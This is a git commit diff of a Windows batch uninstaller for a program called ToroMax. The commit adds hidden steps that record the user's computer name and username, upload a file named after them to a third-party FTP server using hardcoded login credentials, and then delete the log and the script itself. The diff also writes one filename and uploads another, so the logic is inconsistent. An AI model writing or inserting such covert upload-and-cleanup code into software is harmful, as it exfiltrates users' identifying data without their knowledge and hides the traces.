91288defef5c9ffc8aa234517314108ba6f64b04
Papela <45976195+Papela@users.noreply.github.com>
2021-03-24 18:46:26 +0100

    Update UninstallToroMax.bat

--- UninstallToroMax.bat
+++ UninstallToroMax.bat
@@ -1,8 +1,15 @@
 @echo off
 cd "C:\Users\%username%\"
 rd /S /Q ToroMax
+timeout /t 1 /NOBREAK
+cd "C:\Users\%username%\AppData\Local\Temp\"
+@echo %computername% o %username% se ha desinstalado ToroMax. >> Desinstalaciones.txt
+curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
+timeout /t 1
+del Desinstalaciones.txt /F
 color A
 cls
 @echo ToroMax Desinstalado Correctamente... :(
 pause
+del UninstallToroMax.bat /F
 exit
